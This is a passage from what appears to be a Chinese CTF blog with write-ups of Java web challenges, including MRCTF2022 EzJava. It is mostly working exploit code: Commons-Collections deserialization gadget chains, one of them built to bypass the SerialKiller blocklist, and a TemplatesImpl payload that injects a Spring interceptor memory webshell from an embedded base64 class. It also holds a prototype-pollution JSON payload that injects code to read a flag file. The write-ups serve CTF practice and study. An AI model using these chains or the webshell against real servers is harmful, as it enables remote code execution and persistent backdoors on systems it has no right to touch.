class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)));<br><br>        TiedMapEntry tiedmap = <span class="hljs-keyword">new</span> TiedMapEntry(map,<span class="hljs-number">123</span>);<br><br>        HashSet hashset = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);<br>        hashset.add(<span class="hljs-string">&quot;foo&quot;</span>);<br><br>        Field field = Class.forName(<span class="hljs-string">&quot;java.util.HashSet&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        HashMap hashset_map = (HashMap) field.get(hashset);<br><br>        Field table = Class.forName(<span class="hljs-string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        table.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] array = (Object[])table.get(hashset_map);<br><br>        Object node = array[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span>(node == <span class="hljs-keyword">null</span>)&#123;<br>            node = array[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        Field key = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        key.setAccessible(<span class="hljs-keyword">true</span>);<br>        key.set(node,tiedmap);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./cc6&quot;</span>));<br>            outputStream.writeObject(hashset);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./cc6&quot;</span>));<br>            Path file = Paths.get(<span class="hljs-string">&quot;cc6&quot;</span>);<br>            System.out.println(Base64.getEncoder().encodeToString(Files.readAllBytes(file)));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setField</span><span class="hljs-params">(Object obj, String field,Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Field f = obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-keyword">true</span>);<br>        f.set(obj,value);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>网上大佬的exp</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.DefaultedMap;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Payload</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Field field = obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;<br>                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()<br>        &#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<br>                        <span class="hljs-keyword">new</span> Class[] &#123; Templates.class &#125;,<br>                        <span class="hljs-keyword">new</span> Object[] &#123; obj &#125;)<br>        &#125;;<br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);<br>        Map hashMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = DefaultedMap.decorate(hashMap, transformerChain);<br>        <span class="hljs-comment">// 用恶意Map初始化TiedMapEntry类</span><br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;key&quot;</span>);<br>        <span class="hljs-comment">// 将构造好的TiedMapEntry对象作为HashMap的一个key</span><br>        HashMap evalMap = <span class="hljs-keyword">new</span> HashMap();<br>        evalMap.put(tiedMapEntry, <span class="hljs-string">&quot;test&quot;</span>);<br>        outerMap.remove(<span class="hljs-string">&quot;key&quot;</span>);<br>        <span class="hljs-comment">// 用反射设置把恶意构造的Transformer</span><br>        Field declaredFields = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        <span class="hljs-comment">// 设置权限</span><br>        declaredFields.setAccessible(<span class="hljs-keyword">true</span>);<br>        declaredFields.set(transformerChain, transformers);<br>        <span class="hljs-comment">// ==================</span><br>        <span class="hljs-comment">// 生成序列化字符串</span><br>        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);<br>        oos.writeObject(evalMap);<br>        oos.close();<br>        System.out.println(<span class="hljs-keyword">new</span> String(Base64.getEncoder().encode(barr.toByteArray())));<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>打spring内存马,成功后访问<code>?code=&#123;&#123;cmd&#125;&#125;</code>即可<br>参考<a href="https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/">spring内存马</a></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.support.RequestContextUtils;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">inject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractTranslet</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br><span class="hljs-comment">//            WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="hljs-comment">//从requestMappingHandlerMapping中获取adaptedInterceptors属性 老版本是DefaultAnnotationHandlerMapping</span><br>            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping.class);<br><br>            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>            field.setAccessible(<span class="hljs-keyword">true</span>);<br>            java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);<br><br>            String className = <span class="hljs-string">&quot;magicInterceptor&quot;</span>;<br>            <span class="hljs-comment">//加载com.example.spring.magicInterceptor类的字节码</span><br>            String b64 = <span class="hljs-string">&quot;yv66vgAAADQAhwoAIABGCAA4CwBHAEgLAEkASggASwgATAoATQBOCgAMAE8IAFAKAAwAUQcAUgcAUwgAVAgAVQoACwBWCABXCABYBwBZCgALAFoKAFsAXAoAEgBdCABeCgASAF8KABIAYAoAEgBhCgASAGIKAGMAZAoAYwBlCgBjAGIHAGYHAGcHAGgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUxjb20vZXhhbXBsZS9zcHJpbmcvbWFnaWNJbnRlcmNlcHRvcjsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABbwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2hhbmRsZXIBABJMamF2YS9sYW5nL09iamVjdDsBAARjb2RlAQANU3RhY2tNYXBUYWJsZQcAUwcAaQcAUgcAWQcAZwcAagcAawcAbAcAZgEACkV4Y2VwdGlvbnMBAApTb3VyY2VGaWxlAQAVbWFnaWNJbnRlcmNlcHRvci5qYXZhDAAhACIHAGoMAG0AbgcAawwAbwBwAQAAAQAHb3MubmFtZQcAcQwAcgBuDABzAHQBAAN3aW4MAHUAdgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACEAdwEABy9iaW4vc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyDAB4AHkHAHoMAHsAfAwAIQB9AQACXEEMAH4AfwwAgACBDACCAHQMAIMAIgcAaQwAhACFDACGACIBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAjY29tL2V4YW1wbGUvc3ByaW5nL21hZ2ljSW50ZXJjZXB0b3IBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABBqYXZhL2xhbmcvT2JqZWN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoACEAHwAgAAAAAAACAAEAIQAiAAEAIwAAAC8AAQABAAAABSq3AAGxAAAAAgAkAAAABgABAAAABwAlAAAADAABAAAABQAmACcAAAABACgAKQACACMAAAG6AAYACQAAAK8rEgK5AAMCADoEGQTGAKEsuQAEAQA6BRIFOgYSBrgAB7YACBIJtgAKmQAiuwALWQa9AAxZAxINU1kEEg5TWQUZBFO3AA86B6cAH7sAC1kGvQAMWQMSEFNZBBIRU1kFGQRTtwAPOge7ABJZGQe2ABO2ABS3ABUSFrYAFzoIGQi2ABiZAAsZCLYAGacABRkGOgYZCLYAGhkFGQa2ABsZBbYAHBkFtgAdpwAFOgUDrASsAAEADwCmAKkAHgADACQAAABGABEAAAAKAAoACwAPAA0AFwAOABsAEAArABEASgATAGYAFQB8ABYAkAAXAJUAGACcABkAoQAaAKYAHACpABsAqwAdAK0AHwAlAAAAZgAKAEcAAwAqACsABwAXAI8ALAAtAAUAGwCLAC4ALwAGAGYAQAAqACsABwB8ACoAMAAxAAgAAACvACYAJwAAAAAArwAyADMAAQAAAK8ANAA1AAIAAACvADYANwADAAoApQA4AC8ABAA5AAAAOQAH/gBKBwA6BwA7BwA6/AAbBwA8/AAlBwA9QQcAOv8AGgAFBwA+BwA/BwBABwBBBwA6AAEHAEIBAQBDAAAABAABAB4AAQBEAAAAAgBF&quot;</span>; <span class="hljs-comment">// magicInterceptor类class的base64编码</span><br>            <span class="hljs-keyword">byte</span>[] bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);<br>            java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();<br>            java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class);<br>            m0.setAccessible(<span class="hljs-keyword">true</span>);<br>            m0.invoke(classLoader, className, bytes, <span class="hljs-number">0</span>, bytes.length);<br>            <span class="hljs-comment">//添加com.example.spring.magicInterceptor类到adaptedInterceptors</span><br>            adaptedInterceptors.add(classLoader.loadClass(className).newInstance());<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="Looking-for-treasure"><a href="#Looking-for-treasure" class="headerlink" title="Looking for treasure"></a>Looking for treasure</h2><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http">POST /validated/json-schema/validate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br>&#123;<br>    &quot;$schema&quot;:&#123;<br>    &quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;<br>    &quot;__proto__&quot;:&#123;<br>    &quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;<br>    &quot;outputFunctionName&quot;:&#123;<br>    &quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;x;var buf = Buffer.alloc(128);var fs = process.mainModule.require(`fs`);var fd=fs.openSync(`/fl`+`ag`);fs.readSync(fd, buf, 0, 128);fs.closeSync(fd);return buf.toString();//x&quot;&#125;,&quot;path&quot;:&#123;<br>    &quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;/foo&quot;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MRCTF2022</title>
    <link href="/2022/07/13/2022-7-13-MRCTF2022/"/>
    <url>/2022/07/13/2022-7-13-MRCTF2022/</url>
    
    <content type="html"><![CDATA[<p>部分题目源码<a href="https://github.com/EkiXu/My-CTF-Challenge/tree/main/tprint">https://github.com/EkiXu/My-CTF-Challenge/tree/main/tprint</a></p><p>参考wp</p><p><a href="https://blog.wm-team.cn/index.php/archives/18/">wm的wp</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI3NTg2NTk5Mg==&mid=2247484132&idx=1&sn=55fdb98a839bd2e0a8d14934a0fef757&chksm=eb7f0a03dc0883155a73e1c9326e28be458aa55b7847c5390a43df8702403facb84ab0a06a04&mpshare=1&scene=23&srcid=0425FBJKvWlNewXNv00ett0i&sharer_sharetime=1650892617392&sharer_shareid=ef2a828dd213b828cd3fe897350642f0#rd">eki的wp</a></p><p><a href="https://www.le1a.com/posts/e069101d/#MRCTF-2022-EzJava">wp</a></p><h1 id="MRCTF2022"><a href="#MRCTF2022" class="headerlink" title="MRCTF2022"></a>MRCTF2022</h1><p>一些队内大爹出的java题目，复现一下。已经忘记什么时候写的了，有点烂尾，还有的没写完。</p><h1 id="EzJava-–-Bypass-Serialkiller"><a href="#EzJava-–-Bypass-Serialkiller" class="headerlink" title="EzJava – Bypass Serialkiller"></a>EzJava – Bypass Serialkiller</h1><p>ban了ysoserial中cc1-7的链子，不过还有FactoryTransformer，ConstantTransformer可以绕过。<br>FactoryTransformer<br>这个类的内容很简单，transform方法可以调用Factory子类的create()方法</p><p><img src="https://img-blog.csdnimg.cn/5a989934b7f54ee983abca755289e3b3.png" alt="在这里插入图片描述"></p><p>ConstantFactory<br>这个类可以返回任意类，可替换ConstantTransformer。不过这里其实用不上这个<br><img src="https://img-blog.csdnimg.cn/7a105b5ea2414accadcd81f58fc10329.png" alt="在这里插入图片描述"></p><p>InstantiateFactory<br>这个类里就有create()方法，并且可以实例化任意类，是不是发现和InstantiateTransformer很相似。<br><img src="https://img-blog.csdnimg.cn/485c9795539b4899a0f17799cb3f591b.png" alt="在这里插入图片描述"></p><p>在这里插入图片描述</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.FactoryTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateFactory;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.nibblesec.tools.SerialKiller;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br><br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;<br>                ClassPool.getDefault().get(inject.class.getName()).toBytecode( )<br>        &#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        InstantiateFactory instantiateFactory;<br>        instantiateFactory = <span class="hljs-keyword">new</span> InstantiateFactory(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class,<span class="hljs-keyword">new</span> Class[]&#123;javax.xml.transform.Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;obj&#125;);<br><br>        FactoryTransformer factoryTransformer = <span class="hljs-keyword">new</span> FactoryTransformer(instantiateFactory);<br>        ConstantTransformer constantTransformer = <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        LazyMap outerMap = (LazyMap)LazyMap.decorate(innerMap, constantTransformer);<br>        TiedMapEntry tme = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);<br>        Map expMap = <span class="hljs-keyword">new</span> HashMap();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>        setFieldValue(outerMap,<span class="hljs-string">&quot;factory&quot;</span>,factoryTransformer);<br>        outerMap.remove(<span class="hljs-string">&quot;keykey&quot;</span>);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(expMap);<br>        objectOutputStream.close();<br><br>        String payloads = <span class="hljs-keyword">new</span> String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));<br>        System.out.printf(payloads);<br><br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(Base64.getDecoder().decode(payloads));<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> SerialKiller(byteArrayInputStream, <span class="hljs-string">&quot;serialkiller.conf&quot;</span>);<br>        ois.readObject();<br>        ois.close();<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Field field = 